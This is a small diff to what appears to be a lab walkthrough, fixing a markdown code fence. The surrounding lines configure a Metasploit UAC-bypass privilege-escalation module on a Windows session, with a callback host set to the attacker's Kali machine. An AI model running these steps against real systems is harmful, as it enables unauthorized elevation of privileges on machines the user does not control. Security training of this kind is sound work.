@@ -153,7 +153,7 @@ use exploit/windows/local/bypassuac
 set session 1
 set LHOST 192.168.56.102    # ← YOUR KALI IP, NOT 127.0.0.1
 set LPORT 4445              # ← Use a NEW port to avoid conflict
-````
+```
 
 
 
